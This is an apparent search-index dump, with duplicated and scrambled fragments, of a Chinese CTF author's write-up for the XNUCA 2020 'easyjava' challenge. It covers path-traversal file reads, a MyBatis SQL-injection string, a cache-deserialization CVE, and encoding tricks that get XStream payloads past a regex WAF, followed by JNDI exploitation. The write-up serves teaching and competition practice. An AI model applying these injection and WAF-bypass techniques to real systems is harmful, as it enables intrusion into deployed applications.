\u5230 \u8fd9\u91cc \u5c31 \u6bd4\u8f83 \u6e05\u6670 \u4e86 \uff0c \u6211\u4eec \u9700\u8981 \u5229\u7528 \u524d\u9762 \u53d1\u73b0 \u7684 SQL \u6ce8\u5165 \u70b9 \uff0c \u8fdb\u884c \u6ce8\u5165 \u6784\u9020 \u4efb\u610f \u7684 xml \u6570\u636e   \u5e76 \u5229\u7528 mybatis \u7684 \u9ed8\u8ba4 \u4e8c\u7ea7 \u7f13\u5b58 \u4e8c\u7ea7\u7f13\u5b58 \u4f7f\u7528 serialization \u7684 \u539f\u7406 \uff08 \u5982\u4e0b \u56fe \u5b98\u65b9 \u6587\u6863 \u6240\u793a \uff09 \uff0c \u6765 \u89e6\u53d1 xstream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u5c31 \u6839\u636e \u9898\u76ee \u7684 \u7b7e\u540d \u5b9e\u73b0 \uff0c \u6765 \u6ce8\u5165 \u4efb\u610f \u6570\u636e \uff0c \u4ee5 \u5982\u4e0b \u4ee3\u7801 \u4e3a\u4f8b \uff0c \u751f\u6210 \u5b58\u5728 \u6ce8\u5165 \u8bed\u53e5 \u7684 jpg \u6587\u4ef6   try {   String   payload   =   \" evil   xml \" ;   File   file   =   new   File ( \" xxxx . jpg \" ) ;   File   dest   =   new   File ( \" xxxx . jpg \" ) ;   InputStream   inputStream   =   new   FileInputStream ( file ) ;   byte [ ]   bytes   =   new   byte [ ( int ) file . length ( ) ] ;   inputStream . read ( bytes ) ;   InputStream   destInputStream   =   new   FileInputStream ( dest ) ;   String   secret = \" '   union   select   13 , ' wh1t3p1g ' , ' wh1t3p1g ' , ' \" + payload + \" ' , ' aed2bebb781ae32d94c5e67185e35149 \" ;   String   hash   =   \" aed2bebb781ae32d94c5e67185e35149 \" ;   ImageUtil . transferTo ( inputStream ,   bytes ,   null ,   dest ,   secret ,   hash ) ;   } catch   ( Exception   e ) {   e . printStackTrace ( ) ;   }   \u63d0\u4ea4 \u540e \u53ef\u4ee5 \u770b\u5230 \u5177\u4f53 \u7684 \u6548\u679c \uff0c \u91cd\u590d \u63d0\u4ea4 \u4e24\u6b21 \uff0c \u5373\u53ef \u89e6\u53d1 xml \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   # 4   XStream \u6b63\u5219 waf \u7ed5\u8fc7   \u4ece \u9898\u76ee \u4e0a \u6765\u770b \uff0c XStream \u7684 \u5b9e\u73b0 \u9700\u8981 \u7ed5\u8fc7 \u4e24\u4e2a \u70b9 \uff1a   PureJavaReflectionProvider   PureJavaReflectionProvider \u4e0d \u652f\u6301 \u4e0d \u5b58\u5728 \u65e0\u53c2 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u7684 \u7c7b \u7684 \u8fd8\u539f \uff0c \u4ee5\u53ca \u8be5\u7c7b \u5982\u679c \u662f \u53ef \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \uff0c \u90a3\u4e48 \u5b83 \u7684 readObject \u4e0d\u80fd \u6709\u7c7b \u5c5e\u6027 \u4e0a \u7684 \u8fd8\u539f \u3002 \u8fd9 \u56e0\u4e3a \u662f\u56e0\u4e3a PureJavaReflectionProvider \u5bf9\u4e8e \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u64cd\u4f5c \uff0c \u5e76\u975e \u662f \u4e00\u4e2a \u9012\u5f52 \u7684 \u8fc7\u7a0b \uff0c \u6709\u7a7a \u518d \u5199 \u8fd9\u4e2a \u5206\u6790 \uff1a \uff09   \u6b63\u5219 waf   \u9898\u76ee \u5e76 \u6ca1\u6709 \u9075\u5faa XStream \u5b98\u65b9 \u7684 \u7c7b \u7981\u7528 \u65b9\u6cd5 \uff0c \u800c\u662f \u91c7\u7528 \u6b63\u5219 \u7684 \u65b9\u5f0f \u5148 \u5bf9\u5f85 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 xml \u5b57\u7b26 \u5b57\u7b26\u4e32 \u8fdb\u884c \u68c0\u6d4b \uff0c \u68c0\u6d4b \u901a\u8fc7 \u540e \u518d \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u5173\u4e8e \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u70b9 \uff0c \u6bd4\u8f83 \u5bb9\u6613 \u89e3\u51b3 \uff0c \u53c2\u8003 marshalsec \u5bf9\u4e8e spring   jndi \u5229\u7528 \u94fe \u7684 \u5b9e\u73b0 \uff0c \u8be5\u94fe \u7b26\u5408 \u6211 \u8bf4 \u7684 \u8981\u6c42   \u800c \u5bf9\u4e8e \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u70b9 \uff0c \u8fd9\u91cc \u6ca1\u6709 \u7528 \u5b98\u65b9 \u7684 \u65b9\u6cd5 \uff0c \u63d0\u793a \u4e86 \u6211\u4eec \u9700\u8981 \u5bf9 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4e0a \u505a\u4e9b \u64cd\u4f5c \u6765 \u7ed5\u8fc7 \u6b63\u5219 waf \u3002 \u6211\u4eec \u53c2\u8003 fastjson \u7684   @ type   \u7684 unicode \u7f16\u7801 \u7ed5\u8fc7 \u65b9\u5f0f \uff0c \u518d \u770b\u770b \u662f\u5426 \u5bf9\u4e8e XStream \uff0c \u4e5f \u540c\u6837 \u5b58\u5728 \u8fd9\u79cd \u95ee\u9898 \uff1f   \u7b54\u6848 \u662f \u80af\u5b9a \u7684 \uff0c \u4ecb\u7ecd \u4e00\u4e0b XStream \u7684 \u7f16\u7801 \u7ed5\u8fc7 \uff1a   \u9488\u5bf9 \u6807\u7b7e \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u7ed5\u8fc7   \u4ee5 spring   jndi \u5229\u7528 \u94fe\u4e3a \u6848\u4f8b   < org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   < / org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   \u5f53\u524d \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u4e3a   org [ . ] springframework   \uff0c \u6b64\u65f6 \u7684 \u7ed5\u8fc7 \u65b9\u6cd5 \u53ef\u4ee5 \u4e3a   < org . s _. 0070ringframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   < / org . s _. 0070ringframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   \u8fd9\u91cc \u7684 \u539f\u7406 \u5728\u4e8e xstream \u4f1a \u5bf9 \u7b26\u5408 \u683c\u5f0f \u7684 16 \u8fdb\u5236 \u505a \u8f6c\u6362   com . thoughtworks . xstream . io . xml . AbstractXmlReader # unescapeXmlName   com . thoughtworks . xstream . io . xml . XmlFriendlyNameCoder # decodeName   for   ( ;   i   <   length   ;   i   ++   )   {   char   c   =   name   .   charAt   (   i   ) ;   if   (   c   = =   dollarReplacementFirstChar   &&   name   .   startsWith   (   dollarReplacement   ,   i   ) )   {   i   + =   dollarReplacement   .   length   ( )   -   1   ;   result   .   append   (   ' $ '   ) ;   }   else   if   (   c   = =   hexPrefixFirstChar   &&   name   .   startsWith   (   hexPrefix   ,   i   ) )   {   / /   \u5904\u7406 hex \u683c\u5f0f \u7684 \u6807\u7b7e \u5185\u5bb9 \uff0c \u5176 \u6b63\u786e \u683c\u5f0f \u4e3a _. xxxx   i   + =   hexPrefix   .   length   ( ) ;   c   =   (   char   )   Integer   .   parseInt   (   name   .   substring   (   i   ,   i   +   4   ) ,   16   ) ;   i   + =   3   ;   result   .   append   (   c   ) ;   }   else   if   (   c   = =   escapeReplacementFirstChar   &&   name   .   startsWith   (   escapeCharReplacement   ,   i   ) )   {   i   + =   escapeCharReplacement   .   length   ( )   -   1   ;   result   .   append   (   ' _ '   ) ;   }   else   {   result   .   append   (   c   ) ;   }   }   \u4ece dollarReplacement \uff0c hexPrefix \uff0c escapeCharReplacement \u4e09\u8005 \u6765\u770b \uff0c \u6700\u7ec8 \u4e0d \u5f71\u54cd \u6211\u4eec \u7ed5\u8fc7 \u7684 \u4e3a 16 \u8fdb\u5236 \u7684 \u5904\u7406   _. xxxx   \u8f6c\u6362 \u6362\u6210 \u8f6c\u6362\u6210 \u5b9e\u9645 \u7684 \u5b57\u7b26 \u3002   \u9488\u5bf9 \u6807\u7b7e \u5c5e\u6027 \u5185\u5bb9 \u7684 \u7ed5\u8fc7   \u6848\u4f8b   < org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor   serialization =   \" custom \"   >   < / org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   \u6b64\u65f6 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u4e3a   custom   \uff0c \u90a3\u4e48 \u7ed5\u8fc7 \u65b9\u6cd5 \u53ef\u4ee5 \u4e3a   < org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor   serialization =   \" cust &# 111 ; m \"   >   < / org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   \u539f\u7406 \u4e3a \u8bfb\u53d6 \u5c5e\u6027 \u5185\u5bb9 \u65f6 \uff0c \u4f1a \u505a \u7b26\u5408 \u8981\u6c42 \u7b26\u5408\u8981\u6c42 \u7684 \u8f6c\u5316   com . sun . org . apache . xerces . internal . impl . XMLScanner   scanAttributeValue   \u8be5 \u51fd\u6570 \u5185\u5bb9 \u6bd4\u8f83 \u591a \uff0c \u4e0d \u8d34\u51fa \u51fa\u6765 \u8d34\u51fa\u6765 \u4e86 \uff0c \u4ece 883 \u884c\u5230 942 \u884c\u5747 \u5728 \u5904\u7406 html \u7f16\u7801 \u683c\u5f0f \uff0c \u5e76 \u5c06 \u5176 \u8f6c\u5316 \u4e3a \u5b9e\u9645 \u7684 \u5b57\u7b26   \u6240\u4ee5 \u8fd9\u91cc   &# 111 ;   \u5c06 \u8f6c\u5316 \u4e3a   o   \u9488\u5bf9 \u6807\u7b7e \u5185\u5bb9 \u7684 \u7ed5\u8fc7   \u6848\u4f8b   < test >   ldap : / / xxxxx   < / test >   \u6b64\u65f6 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u4e3a   ldap : / /   \uff0c \u53ef\u4ee5 \u7528 \u5982\u4e0b \u7684 \u51e0\u79cd \u65b9\u6cd5 \u7ed5\u8fc7   a .   html \u7f16\u7801   \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u5728 \u63d0\u53d6 \u6570\u636e \u65f6 \uff0c \u540c\u6837 \u5bf9 html \u7f16\u7801 \u7684 \u5185\u5bb9 \u505a \u4e86 \u8f6c\u5316   < test >   &# 108 ;   dap : / / xxxxx   < / test >   \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u8ddf \u4e0a\u9762   \u6807\u7b7e \u5c5e\u6027 \u5185\u5bb9 \u7684 \u7ed5\u8fc7   \u7684 \u4e00\u6837 \uff0c \u4e0d\u518d \u53d9\u8ff0   b .   \u6ce8\u91ca \u7684 \u65b9\u6cd5   \u5728 \u5904\u7406 \u5b9e\u9645 \u7684 \u6807\u7b7e \u5185\u5bb9 \u65f6 \uff0c \u9047\u5230 \u6ce8\u89c6 \u5185\u5bb9 \u5c06 \u88ab \u5ffd\u7565 \u6389   < test >   ld   < ! --   test   -- >   ap : / / xxxxx   < / test >   com . thoughtworks . xstream . converters . reflection . AbstractReflectionConverter # unmarshallField   com . thoughtworks . xstream . io . xml . AbstractPullReader # getValue   public   String   getValue   ( )   {   / /   ...   Event   event   =   readEvent   ( ) ;   while   (   true   )   {   if   (   event   .   type   = =   TEXT   )   {   / /   \u5904\u7406 \u5b57\u7b26   String   text   =   event   .   value   ;   if   (   text   ! =   null   &&   text   .   length   ( )   >   0   )   {   if   (   last   = =   null   )   {   last   =   text   ;   }   else   {   if   (   buffer   = =   null   )   {   buffer   =   new   StringBuffer   (   last   ) ;   }   buffer   .   append   (   text   ) ;   }   }   }   else   if   (   event   .   type   ! =   COMMENT   )   {   / /   \u975e \u5b57\u7b26   \u4e14   \u4e0d\u662f \u6ce8\u91ca \u65f6   \u8df3\u51fa   break   ;   }   event   =   readEvent   ( ) ;   / /   \u7ee7\u7eed   }   reset   ( ) ;   if   (   buffer   ! =   null   )   {   return   buffer   .   toString   ( ) ;   }   else   {   return   (   last   = =   null   )   ?   \" \"   :   last   ;   }   }   \u4ece \u524d\u9762 \u7684 \u4ee3\u7801 \u4e2d \u6765\u770b \uff0c \u8fd9\u91cc \u4e3b\u8981 \u5728 \u5bf9 \u5b57\u7b26 \u8fdb\u884c \u62fc\u63a5 \uff0c \u5e76\u4e14 \u9047\u5230 \u6ce8\u91ca \u65f6 \u5c06 \u8df3 \u8fc7 \uff0c \u6240\u4ee5 \u5982\u679c \u5728 \u5185\u5bb9 \u4e2d\u6dfb \u4e0a \u6ce8\u91ca \u4e5f \u80fd \u8fbe\u5230 \u7ed5\u8fc7 \u7684 \u6548\u679c   \u7ecf\u8fc7 \u4e0a\u9762 XStream \u7c7b\u578b \u89e3\u6790 \u5206\u6790 \uff0c \u6211\u4eec \u53ef\u4ee5 \u6784\u9020 \u51fa \u7ed5\u8fc7 \u6b63\u5219 waf \u7684 payload \u6765   # 5   \u9ad8 \u7248\u672c JNDI \u6ce8\u5165 \u7684 \u5229\u7528   \u5728 \u751f\u6210 \u5177\u4f53 \u7684 exp \u540e \uff0c \u53ef\u4ee5 \u5bf9\u5916 \u53d1\u8d77 JNDI \u8fde\u63a5 \uff0c \u5230 \u8fd9 \u4e00\u6b65 \uff0c \u6211\u4eec \u9700\u8981 \u53bb \u5224\u65ad \u5176\u4e3a \u9ad8 \u7248\u672c jdk \u8fd8\u662f \u4f4e\u7248 \u7248\u672c \u4f4e\u7248\u672c \u7684 jdk \u3002 \u5982\u679c \u662f \u4f4e\u7248 \u7248\u672c \u4f4e\u7248\u672c \u7684 jdk \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u5229\u7528 codebase \u52a0\u8f7d \u4efb\u610f \u7684 class \u6765 \u8fbe\u5230 \u547d\u4ee4 \u6267\u884c \u7684 \u6548\u679c \uff0c \u800c \u9ad8 \u7248\u672c \u7684 jdk \u53ea\u80fd \u4f9d\u8d56 \u672c\u5730 ObjectFactory \u6216 \u672c\u5730 \u5229\u7528 \u94fe\u6765 \u8fdb\u884c \u653b\u51fb \uff0c \u53c2\u8003   KINGX \u7684 \u6587\u7ae0   \u3002   \u800c \u672c\u9898 \u8003\u67e5 \u7684 \u4e3a \u9ad8 \u7248\u672c jdk \u73af\u5883 \u4e0b \u7684 \u5229\u7528 \uff0c \u90a3\u4e48 \u5c31 \u6709 \u4e24\u79cd \u9009\u62e9 \uff0c \u4e00\u4e3a \u672c\u5730 \u5229\u7528 \u94fe \u89e6\u53d1 \u547d\u4ee4 \u6765 \u6267\u884c \uff0c \u4e8c\u4e3a \u672c\u5730 ObjectFactory \u8fbe\u6210 \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u3002   \u4ece \u9898\u76ee \u7684 \u4f9d\u8d56 \u6765\u770b \uff0c \u6211\u4eec \u5e76 \u4e0d\u80fd \u627e\u5230 \u4e00\u4e2a \u5408\u9002 \u7684 \u672c\u5730 \u5229\u7528 \u94fe\u6765 \u8fbe\u6210 \u5229\u7528 \uff0c \u90a3\u4e48 \u8003\u5bdf \u7684 \u5c31\u662f \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u65b9\u6cd5 \u7684 \u5229\u7528 \u4e86 \u3002 \u56e0\u4e3a \u9898\u76ee \u7528 \u7684 \u662f spring   boot   embedded   tomcat \uff0c \u6240\u4ee5 \u6211\u4eec \u80fd \u76f4\u63a5 \u5229\u7528 KINGX \u5e08\u5085 \u6587\u7ae0 \u4e2d \u63d0\u5230 \u7684 \u65b9\u6cd5 \uff0c \u5177\u4f53 \u7684 \u5229\u7528 \u8fc7\u7a0b \u4e0d\u63d0 \u4e86 \uff0c \u53ef\u4ee5 \u7528 \u6211 \u7684 ysomap \u6765 \u8fbe\u6210 \u547d\u4ee4 \u6267\u884c \u7684 \u6548\u679c   0x02   exp   exp . java","title":"xnuca2020   easyjava \u8bbe\u8ba1 \u601d\u8def"},{"location":"writeups/2020/xnuca-2020-easyjava/#0x00","text":"easyjava \u7684 \u8bbe\u8ba1 \u601d\u8def \u4e3b\u8981 \u6765\u6e90 \u6e90\u4e8e \u6765\u6e90\u4e8e \u73b0\u5b9e \u73af\u5883 \u4e2d \u9047\u5230 \u7684 \u4e00\u4e9b \u95ee\u9898 \uff0c \u4ee5\u53ca \u6700\u8fd1 \u521a\u51fa \u7684 mybatis \u4e8c\u7ea7 \u7f13\u5b58 \u4e8c\u7ea7\u7f13\u5b58 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5b89\u5168 \u95ee\u9898 \u7684 \u4e00\u79cd \u8bbe\u60f3 \u3002 \u9898\u76ee \u7684 \u8bbe\u8ba1 \u76ee\u7684 \u4e3b\u8981 \u8003\u5bdf \u9009\u624b \u5bf9\u4e8e \u5b9e\u64cd\u6027 \u7684 \u6f0f\u6d1e \u7684 \u5229\u7528 \u4ee5\u53ca \u6e90\u7801 \u5ba1\u8ba1 \u80fd\u529b \u3002   \u5177\u4f53 \u7684 \u8003\u70b9 \u5982\u4e0b \uff1a   \u4efb\u610f \u6587\u4ef6 \u4e0b\u8f7d \uff0c / proc / self / fd \u7684 \u5229\u7528   mybatis \u7f13\u5b58 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c   CVE - 2020 - 26945   xstream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \uff0c \u7b80\u5355 \u6b63\u5219 waf \u7ed5\u8fc7 \uff0c \u7c7b\u6bd4 fastjson   unicode \u7f16\u7801 \u7ed5\u8fc7   \u9ad8 \u7248\u672c java \u7248\u672c \u4e0b \u7684 jndi \u5229\u7528","title":"0x00   \u524d\u8a00"},{"location":"writeups/2020/xnuca-2020-easyjava/#0x01","text":"\u9898\u76ee \u672c\u8eab \u8bbe\u8ba1 \u7684 \u529f\u80fd \u70b9 \u6bd4\u8f83 \u5c11 \uff0c \u4e3b\u8981 \u662f jpg \u56fe\u7247 \u7b7e\u540d \uff0c \u4e0b\u8f7d \u548c\u9a8c \u7b7e \u529f\u80fd","title":"0x01   \u9884\u671f \u9898\u89e3"},{"location":"writeups/2020/xnuca-2020-easyjava/#1","text":"\u8fd9\u91cc \u9996\u5148 \u5173\u6ce8 \u4e0b\u8f7d \u7684 \u63a5\u53e3   \u5728 \u8fd4\u56de \u5305 \u91cc \u5b58\u5728 Check \u5b57\u6bb5 \uff0c \u4e8e get \u8bf7\u6c42 \u4e2d \u7684 sign \u5b57\u6bb5 \u662f \u4e00\u6837 \u7684 \u5185\u5bb9 \uff0c \u5c1d\u8bd5 \u4fee\u6539 filename \u4e3a   .. / .. / .. / .. / .. / .. / etc / passwd   check \u5b57\u6bb5 \u8fd4\u56de \u4e86 \u4e0d \u4e00\u6837 \u7684 \u5185\u5bb9 \uff0c \u8fd9\u91cc \u5224\u65ad \u53ef\u80fd sign \u503c \u7528\u4e8e \u6821\u9a8c \uff0c \u901a\u8fc7 \u624d \u8fd4\u56de \u7ed3\u679c \uff0c \u90a3\u4e48 \u4fee\u6539 sign \u5b57\u6bb5 \uff0c \u5373\u53ef \u83b7\u53d6 \u5230 \u5f53\u524d \u8bf7\u6c42 \u7684 \u5185\u5bb9 \u3002 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u7531\u4e8e \u662f linux \u7cfb\u7edf \uff0c \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 \u66b4\u529b fd \u503c\u6765 \u83b7\u53d6 \u5230 \u5f53\u524d \u8fd0\u884c \u7684 jar \u5305 \u5185\u5bb9 \uff0c \u5982   / proc / self / fd / 4   \u6765 \u83b7\u53d6 jar \u5305","title":"# 1   \u6e90\u7801 \u83b7\u53d6"},{"location":"writeups/2020/xnuca-2020-easyjava/#2-mybatis-sql","text":"\u62ff\u5230 jar \u7f16\u8bd1 \u53cd\u7f16\u8bd1 \u540e \u5148 \u770b pom \uff0c \u5176\u4e2d \u6bd4\u8f83 \u5bb9\u6613 \u5173\u6ce8 \u7684 \u4e3b\u8981 \u662f \u4e24\u4e2a jar \u5305 \uff0c \u4e00\u4e2a \u662f mybatis \u7684 springboot \u5305 \uff0c \u53e6 \u4e00\u4e2a \u662f xstream \u7684 \u5305   \u5982\u679c \u5173\u6ce8 cve \u52a8\u6001 \u7684\u8bdd \uff0c \u53ef\u4ee5 \u77e5\u9053 \u6700\u8fd1 \u521a\u51fa \u7684 \u6f0f\u6d1e   CVE - 2020 - 26945   \uff0c \u867d\u7136 mybatis \u7684 \u7248\u672c \u5df2\u7ecf \u8fdb\u884c \u4e86 \u5347\u7ea7 \uff0c \u4f46 spring \u7684 mybatis \u5305\u4e2d \u7684 mybatis \u4f9d\u8d56 \u5e76 \u6ca1\u6709 \u5347\u7ea7 \uff0c \u4ecd\u7136 \u662f 3.5 . 5 \u7248\u672c \uff0c \u518d \u786e\u5b9a \u4e00\u4e0b \uff0c \u662f\u5426 \u542f\u7528 \u4e86 cache   \u4ece mapper \u5bf9\u5e94 \u7684 xml \u914d\u7f6e \u91cc \u53ef\u4ee5 \u770b\u5230 \u5f00\u542f \u4e86 cache \u914d\u7f6e \uff0c \u5e76\u4e14   findByHashAndSecret   \u63a5\u53e3 \u5b58\u5728 \u6ce8\u5165 \u3002   \u5230 \u8fd9\u91cc \u5c31 \u7b80\u5355 \u4e86 \uff0c \u6211\u4eec \u53ea\u8981 \u627e \u4e00\u4e0b \uff0c \u8c03\u7528 \u70b9 \u786e\u8ba4 \u662f\u5426 \u53ef\u63a7 \uff0c \u5373\u53ef \u786e\u8ba4 \u662f\u5426 \u5b58\u5728 \u6ce8\u5165   nese . game . controller . CheckController   \u5b58\u5728 \u94fe\u8def \uff0c \u6587\u4ef6 \u4ece\u6587\u4ef6 \u4e2d \u83b7\u53d6 \u5185\u5bb9 \uff0c \u5e76 \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \uff0c \u6240\u4ee5 \u8fd9\u8fb9 \u6211\u4eec \u80fd \u8fbe\u5230 \u4e00\u4e2a \u6ce8\u5165 \u7684 \u6548\u679c","title":"# 2   mybatis   SQL \u6ce8\u5165"},{"location":"writeups/2020/xnuca-2020-easyjava/#3-mybatis","text":"\u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u7ee7\u7eed \u8fdb\u884c \u5ba1\u8ba1 \uff0c \u5173\u6ce8 \u4e00\u4e0b \u53e6 \u4e00\u4e2a \u4e00\u4e2a\u70b9 xstream \u5305 \u7684 \u5b89\u5168 \u95ee\u9898 \u3002 \u5728   nese . game . entity . Picture   \u5bf9\u8c61 \u4e0a \uff0c \u8c03\u7528 \u4e86 xstream \u7684 fromXML \u51fd\u6570 \uff0c \u5e76\u4e14 \u5728   readObject   \u51fd\u6570 \u5904 \u5bf9 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u7c7b\u578b \u7684 xml \u8fdb\u884c \u8fd8\u539f   \u5230 \u8fd9\u91cc \u5c31 \u6bd4\u8f83 \u6e05\u6670 \u4e86 \uff0c \u6211\u4eec \u9700\u8981 \u5229\u7528 \u524d\u9762 \u53d1\u73b0 \u7684 SQL \u6ce8\u5165 \u70b9 \uff0c \u8fdb\u884c \u6ce8\u5165 \u6784\u9020 \u4efb\u610f \u7684 xml \u6570\u636e   \u5e76 \u5229\u7528 mybatis \u7684 \u9ed8\u8ba4 \u4e8c\u7ea7 \u7f13\u5b58 \u4e8c\u7ea7\u7f13\u5b58 \u4f7f\u7528 serialization \u7684 \u539f\u7406 \uff08 \u5982\u4e0b \u56fe \u5b98\u65b9 \u6587\u6863 \u6240\u793a \uff09 \uff0c \u6765 \u89e6\u53d1 xstream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u5c31 \u6839\u636e \u9898\u76ee \u7684 \u7b7e\u540d \u5b9e\u73b0 \uff0c \u6765 \u6ce8\u5165 \u4efb\u610f \u6570\u636e \uff0c \u4ee5 \u5982\u4e0b \u4ee3\u7801 \u4e3a\u4f8b \uff0c \u751f\u6210 \u5b58\u5728 \u6ce8\u5165 \u8bed\u53e5 \u7684 jpg \u6587\u4ef6   try {   String   payload   =   \" evil   xml \" ;   File   file   =   new   File ( \" xxxx . jpg \" ) ;   File   dest   =   new   File ( \" xxxx . jpg \" ) ;   InputStream   inputStream   =   new   FileInputStream ( file ) ;   byte [ ]   bytes   =   new   byte [ ( int ) file . length ( ) ] ;   inputStream . read ( bytes ) ;   InputStream   destInputStream   =   new   FileInputStream ( dest ) ;   String   secret = \" '   union   select   13 , ' wh1t3p1g ' , ' wh1t3p1g ' , ' \" + payload + \" ' , ' aed2bebb781ae32d94c5e67185e35149 \" ;   String   hash   =   \" aed2bebb781ae32d94c5e67185e35149 \" ;   ImageUtil . transferTo ( inputStream ,   bytes ,   null ,   dest ,   secret ,   hash ) ;   } catch   ( Exception   e ) {   e . printStackTrace ( ) ;   }   \u63d0\u4ea4 \u540e \u53ef\u4ee5 \u770b\u5230 \u5177\u4f53 \u7684 \u6548\u679c \uff0c \u91cd\u590d \u63d0\u4ea4 \u4e24\u6b21 \uff0c \u5373\u53ef \u89e6\u53d1 xml \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316","title":"# 3   mybatis \u4e8c\u7ea7\u7f13\u5b58 \u53cd \u5e8f\u5217\u5316 \u6f0f\u6d1e"},{"location":"writeups/2020/xnuca-2020-easyjava/#4-xstreamwaf","text":"\u4ece \u9898\u76ee \u4e0a \u6765\u770b \uff0c XStream \u7684 \u5b9e\u73b0 \u9700\u8981 \u7ed5\u8fc7 \u4e24\u4e2a \u70b9 \uff1a   PureJavaReflectionProvider   PureJavaReflectionProvider \u4e0d \u652f\u6301 \u4e0d \u5b58\u5728 \u65e0\u53c2 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u7684 \u7c7b \u7684 \u8fd8\u539f \uff0c \u4ee5\u53ca \u8be5\u7c7b \u5982\u679c \u662f \u53ef \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \uff0c \u90a3\u4e48 \u5b83 \u7684 readObject \u4e0d\u80fd \u6709\u7c7b \u5c5e\u6027 \u4e0a \u7684 \u8fd8\u539f \u3002 \u8fd9 \u56e0\u4e3a \u662f\u56e0\u4e3a PureJavaReflectionProvider \u5bf9\u4e8e \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u64cd\u4f5c \uff0c \u5e76\u975e \u662f \u4e00\u4e2a \u9012\u5f52 \u7684 \u8fc7\u7a0b \uff0c \u6709\u7a7a \u518d \u5199 \u8fd9\u4e2a \u5206\u6790 \uff1a \uff09   \u6b63\u5219 waf   \u9898\u76ee \u5e76 \u6ca1\u6709 \u9075\u5faa XStream \u5b98\u65b9 \u7684 \u7c7b \u7981\u7528 \u65b9\u6cd5 \uff0c \u800c\u662f \u91c7\u7528 \u6b63\u5219 \u7684 \u65b9\u5f0f \u5148 \u5bf9\u5f85 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 xml \u5b57\u7b26 \u5b57\u7b26\u4e32 \u8fdb\u884c \u68c0\u6d4b \uff0c \u68c0\u6d4b \u901a\u8fc7 \u540e \u518d \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u5173\u4e8e \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u70b9 \uff0c \u6bd4\u8f83 \u5bb9\u6613 \u89e3\u51b3 \uff0c \u53c2\u8003 marshalsec \u5bf9\u4e8e spring   jndi \u5229\u7528 \u94fe \u7684 \u5b9e\u73b0 \uff0c \u8be5\u94fe \u7b26\u5408 \u6211 \u8bf4 \u7684 \u8981\u6c42   \u800c \u5bf9\u4e8e \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u70b9 \uff0c \u8fd9\u91cc \u6ca1\u6709 \u7528 \u5b98\u65b9 \u7684 \u65b9\u6cd5 \uff0c \u63d0\u793a \u4e86 \u6211\u4eec \u9700\u8981 \u5bf9 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4e0a \u505a\u4e9b \u64cd\u4f5c \u6765 \u7ed5\u8fc7 \u6b63\u5219 waf \u3002 \u6211\u4eec \u53c2\u8003 fastjson \u7684   @ type   \u7684 unicode \u7f16\u7801 \u7ed5\u8fc7 \u65b9\u5f0f \uff0c \u518d \u770b\u770b \u662f\u5426 \u5bf9\u4e8e XStream \uff0c \u4e5f \u540c\u6837 \u5b58\u5728 \u8fd9\u79cd \u95ee\u9898 \uff1f   \u7b54\u6848 \u662f \u80af\u5b9a \u7684 \uff0c \u4ecb\u7ecd \u4e00\u4e0b XStream \u7684 \u7f16\u7801 \u7ed5\u8fc7 \uff1a   \u9488\u5bf9 \u6807\u7b7e \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u7ed5\u8fc7   \u4ee5 spring   jndi \u5229\u7528 \u94fe\u4e3a \u6848\u4f8b   < org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   < / org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   